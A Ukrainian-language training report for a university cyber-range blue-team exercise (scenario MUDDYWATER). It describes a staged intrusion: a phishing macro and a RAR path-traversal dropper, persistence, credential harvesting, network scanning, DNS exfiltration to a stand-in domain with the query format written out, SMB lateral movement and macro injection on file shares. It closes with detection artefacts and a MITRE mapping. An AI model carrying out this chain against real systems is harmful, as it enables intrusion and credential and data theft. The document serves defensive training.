# SC-004 MUDDYWATER — Звіт про атаку
## CyberRanges Blue Team Training | SET University
### EXERCISE ONLY — заборонено використовувати поза навчальним середовищем

---

## 1. ІНФРАСТРУКТУРА АТАКИ

### Сервери атакуючого (NS1 — 172.16.50.10)

| Сервіс | Файл | Порт | Призначення |
|--------|------|------|-------------|
| DNS C2 сервер | `c2_server.py` | UDP/53 | Отримання beacons + DNS ексфільтрація |
| HTTP C2 сервер | `c2_http_server.py` | TCP/80 | Роздача implant_drop.rar та implant.rar |

**Запуск перед початком атаки:**
```bash
sudo python3 ~/c2_server.py            # термінал 1
sudo python3 ~/c2_http_server.py --port 80 --dir ~/serve   # термінал 2
```

**Файли на HTTP сервері (~/serve/):**
- `implant_drop.rar` — містить `implant.ps1` (dropper)
- `implant.rar` — містить всі блоки атаки (config.ps1, block1–block7)
- `test_macro.vbs` — тестовий VBScript для перевірки

---

## 2. ВЕКТОРИ ПОЧАТКОВОГО ДОСТУПУ

### Варіант A — Office документ з VBA macro (spearphishing)

Жертва отримує електронним листом або через месенджер документ Word/Excel
з вбудованим VBA macro (`AutoOpen` / `Auto_Open`).
При відкритті документу macro автоматично спрацьовує.

**Логіка macro (з перевіркою):**
1. Перевіряє чи `implant.ps1` вже є в Startup (міг потрапити з архіву)
2. Якщо **є** — нічого не робить (уже заражено, 100% coverage)
3. Якщо **нема** — завантажує `implant_drop.rar` з C2 HTTP сервера
4. WinRAR розпаковує `implant_drop.rar` прямо в Startup жертви
5. `implant.ps1` тепер запускається **при кожному логоні**

### Варіант B — RAR архів з implant.ps1 + документ (подвійне страхування)

Жертва отримує RAR архів який містить:
- `implant.ps1` — якщо CVE (path traversal) спрацює → потрапляє в Startup автоматично
- Office документ з VBA macro — якщо CVE не спрацює → жертва відкриває документ → macro завантажує implant.ps1 в Startup

**Результат: 100% потрапляння в Startup в обох сценаріях:**

```
Архів отримано
    ├── CVE спрацювало → implant.ps1 в Startup автоматично
    │       macro перевіряє Startup → implant.ps1 є → нічого не робить
    └── CVE не спрацювало → жертва відкриває документ
            macro перевіряє Startup → implant.ps1 немає → завантажує
```

---

## 3. IMPLANT.PS1 — DROPPER (запускається при логоні)

**Розташування:** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\implant.ps1`

**Дії при запуску:**
1. Завантажує `http://updates-gov.net/implant.rar` в `%TEMP%\implant.rar`
2. Знаходить WinRAR
3. Розпаковує всі блоки в `%TEMP%\wupd\`
4. Запускає `block1_persist.ps1`
5. Видаляє `implant.rar`

**Артефакти:** `%TEMP%\wupd\` з усіма block*.ps1 скриптами

---

## 4. BLOCK 1 — Persistence + Orchestrator

**Файл:** `block1_persist.ps1`  
**MITRE:** T1053.005, T1547.001

**Дії:**
1. Встановлює infection marker `C:\Windows\Temp\wsu.lock`
2. Копіює всі скрипти в `%APPDATA%\Microsoft\WinUpd\`
3. Встановлює persistence методом каскадного fallback:
   - **Метод 1:** Scheduled Task `WindowsUpdateCheck` (ONLOGON) → `WinSecUpdate.bat`
   - **Метод 2:** HKCU Run key `SecurityHealthUpdater` → `WinSecUpdate.bat`
   - **Метод 3:** Startup folder → `WinSecUpdate.bat`
4. Надсилає DNS beacon: `B1:PERSIST:<метод>`
5. Запускає ланцюг: B2 → B3 → B4 → B5 → B6 → B7

**Лог:** `C:\ProgramData\upd_logs\block1.log`

---

## 5. BLOCK 2 — System Discovery

**Файл:** `block2_discovery.ps1`  
**MITRE:** T1082, T1033, T1057, T1049, T1555

**Дії:**
1. Збирає системну інформацію → `sysinfo.txt`:
   - hostname, username, OS версія
   - мережеві адаптери та IP адреси
   - запущені процеси
   - активні мережеві з'єднання (netstat)
   - встановлені програми
   - список користувачів та груп
2. Збирає credentials:
   - Windows Credential Manager (CredentialManager)
   - CSV/TXT файли з Desktop та Documents з паролями
   - збережені паролі браузерів (Chrome/Edge шляхи)
3. Зберігає в `C:\ProgramData\upd_logs\creds\`
4. Надсилає beacon: `B2:CREDS:FOUND:<кількість>`

**Лог:** `C:\ProgramData\upd_logs\block2.log`  
**Артефакти:** `sysinfo.txt` (~33KB), папка `creds\`

---

## 6. BLOCK 3 — Network Scan

**Файл:** `block3_scan.ps1`  
**MITRE:** T1046, T1018

**Дії:**
1. Автоматично визначає локальну підмережу (`/24`)
2. **ICMP sweep** (паралельний, 50 потоків, timeout 800ms):
   - 254 хости одночасно → результат за ~3 сек
3. **SMB scan** TCP/445 — паралельний (runspaces)
4. **RDP scan** TCP/3389 — паралельний (runspaces)
5. **DNS reverse lookup** — визначає hostname по IP
6. **NetBIOS scan** UDP/137 — визначає NetBIOS імена
7. Зберігає `hosts.txt` з повним звітом

**Типові результати (мережа 10.10.10.0/24):**
```
ICMP alive: 8 hosts
SMB open:   3 hosts (WS, DC)
RDP open:   3 hosts
DNS names:  3 hosts
NetBIOS:    1 host (DC01)
```

**Тривалість:** ~1 хвилина (з паралельним ICMP)  
**Лог:** `C:\ProgramData\upd_logs\block3.log`

---

## 7. BLOCK 4 — Archive Staging

**Файл:** `block4_staging.ps1`  
**MITRE:** T1560.001

**Дії:**
1. Збирає артефакти блоків 2 і 3: `sysinfo.txt`, `creds\`, `hosts.txt`
2. Копіює в тимчасову staging папку
3. Архівує в ZIP:
   - пріоритет: 7-Zip з паролем (`Upd@te2024!`)
   - fallback: PowerShell `Compress-Archive` (без пароля)
4. Зберігає як `C:\ProgramData\WinUpd_<random>.zip`
5. Записує шлях до архіву в `stage_path.txt` для Block 5

**Розмір архіву:** ~5-6 KB (стиснуті логи)  
**Лог:** `C:\ProgramData\upd_logs\block4.log`

---

## 8. BLOCK 5 — DNS Exfiltration

**Файл:** `block5_exfil.ps1`  
**MITRE:** T1048.003, T1071.004

**Дії:**
1. Перевіряє доступність C2 через DNS (`ping.updates-gov.net`)
2. Читає ZIP архів → конвертує в HEX
3. Ділить на шматки по 30 байт (60 hex символів)
4. Надсилає кожен шматок як DNS запит:
   ```
   <seq_4digits>.<hex_chunk>.exfil.updates-gov.net
   Приклад: 0001.4d455441.exfil.updates-gov.net
   ```
5. Спочатку надсилає metadata beacon:
   ```
   0000.<META:hostname:user:total:size>.exfil.updates-gov.net
   ```
6. C2 сервер reassembles → зберігає файл у `./received/`

**Швидкість:** ~180 chunks за 20 сек (100ms між запитами)  
**Артефакти на NS1:** `./received/exfil_<IP>_<timestamp>.zip`  
**Лог:** `C:\ProgramData\upd_logs\block5.log`

---

## 9. BLOCK 6 — Lateral Movement

**Файл:** `block6_lateral.ps1`  
**MITRE:** T1021.002, T1078, T1547.001

**Передумови:**
- `wsu.lock` файл на цілі відсутній (машина не заражена)
- Доступ до `\\target\C$` через зібрані credentials

**Дії:**
1. Читає credentials з `creds\` папки
2. Читає `hosts.txt` → визначає цілі (SMB хости, не DC)
3. Для кожної цілі:
   - Перевіряє `\\target\C$\Windows\Temp\wsu.lock` (skip if infected)
   - Перебирає credentials (domain\user, IP\user, user)
   - При успішній автентифікації:
     - Копіює всі скрипти в `\\target\C$\Windows\Temp\`
     - Кладе `WinSecUpdate.bat` в ALL-Users Startup
     - Кладе `WinSecUpdate.bat` в Startup всіх user профілів
     - Створює `wsu.lock` на цілі
4. Beacon: `B6:PWNED:<IP>`

**Результат:** WS-2 заражена, при наступному логоні k.roberts → повний ланцюг  
**Лог:** `C:\ProgramData\upd_logs\block6.log`

---

## 10. BLOCK 7 — File Server Macro Injection

**Файл:** `block7_fileserver.ps1`  
**MITRE:** T1137, T1105, T1566.001, T1021.002

**Дії:**
1. Знаходить mapped network shares (`net use` + Registry `HKCU:\Network`)
2. Перевіряє `.winsec` маркер у шарі (skip if already processed)
3. Вмикає доступ до VBA project model (`AccessVBOM` registry key)
4. **Якщо MS Office встановлений:**
   - Відкриває `.docx` через `Word.Application` COM → зберігає як `.docm` з macro
   - Відкриває `.xlsx` через `Excel.Application` COM → зберігає як `.xlsm` з macro
   - Macro `AutoOpen/Auto_Open`: завантажує `implant_drop.rar` → Startup
5. **Fallback (Office не встановлений):**
   - Кладе `WindowsSecurityUpdate.vbs` прямо в шару
6. Залишає `.winsec` маркер у шарі

**Результат:** Будь-який користувач що відкриє документ або VBS → інфікується  
**Лог:** `C:\ProgramData\upd_logs\block7.log`

---

## 11. ПОВНА TIMELINE АТАКИ

```
t+0:00  VBS запущено жертвою
t+0:01  implant.ps1 → Startup
t+0:xx  ПЕРЕЗАВАНТАЖЕННЯ / ЛОГОН

t+0:00  implant.ps1 → завантажує implant.rar → розпаковує → block1
t+0:01  B1: persistence (Run key / schtask / Startup bat)
t+0:16  B2: system discovery, credential harvest
t+0:28  B2: credentials знайдені
t+0:44  B3: network scan START
t+1:45  B3: ICMP sweep done (8 hosts, ~1 хв)
t+2:00  B3: SMB/RDP/DNS/NetBIOS scan done
t+2:05  B4: archive staging (~5KB ZIP)
t+2:20  B5: DNS exfil START (181 chunks)
t+2:40  B5: DNS exfil DONE — дані на C2
t+2:55  B6: lateral movement → WS-2 PWNED
t+3:09  B7: VBS dropped на \\FILES.gov.local\public_folder
t+3:09  B1:ALL:DONE — атака завершена
```

---

## 12. АРТЕФАКТИ ДЛЯ BLUE TEAM

| Компонент | Артефакт | Де виявити |
|-----------|----------|------------|
| VBS запуск | `wscript.exe` spawned | Sysmon EID 1 |
| HTTP download | GET /implant_drop.rar | Zeek/Arkime port 80 |
| Startup persistence | `implant.ps1` в Startup | Sysmon EID 11 |
| HTTP download | GET /implant.rar | Zeek/Arkime port 80 |
| WinRAR extract | `WinRAR.exe -ibck` | Sysmon EID 1 |
| Run key | `SecurityHealthUpdater` | Sysmon EID 13, Wazuh |
| Schtask | `WindowsUpdateCheck` | Sysmon EID 1 (schtasks.exe) |
| Discovery | `net user`, `netstat`, `ipconfig` | Sysmon EID 1 |
| Network scan | ICMP flood, TCP/445, TCP/3389 | Arkime, Wazuh |
| DNS exfil | Сотні запитів до updates-gov.net | Sysmon EID 22, Zeek DNS |
| SMB lateral | `net use \\IP\C$` | Wazuh, Windows EID 4624 |
| File drop | `WinSecUpdate.bat` в Startup | Sysmon EID 11 |
| VBS in share | `WindowsSecurityUpdate.vbs` | Sysmon EID 11 |

---

## 13. MITRE ATT&CK MAPPING

| ID | Назва | Блок |
|----|-------|------|
| T1566.001 | Phishing: Malicious Attachment | Initial Access |
| T1059.005 | VBScript | Initial Access (VBS) |
| T1105 | Ingress Tool Transfer | implant.ps1, B7 |
| T1053.005 | Scheduled Task | B1 |
| T1547.001 | Registry Run Keys / Startup Folder | B1 |
| T1082 | System Information Discovery | B2 |
| T1033 | System Owner/User Discovery | B2 |
| T1555 | Credentials from Password Stores | B2 |
| T1046 | Network Service Scanning | B3 |
| T1018 | Remote System Discovery | B3 |
| T1560.001 | Archive via Utility | B4 |
| T1048.003 | Exfil Over DNS | B5 |
| T1071.004 | DNS C2 | B5 |
| T1021.002 | SMB/Windows Admin Shares | B6 |
| T1078 | Valid Accounts | B6 |
| T1137 | Office Application Macro | B7 |
| T1204.002 | Malicious File (user execution) | B7 |

---

*Звіт підготовлено для навчального сценарію SC-004 MUDDYWATER*  
*SET University CyberRanges Blue Team Training*
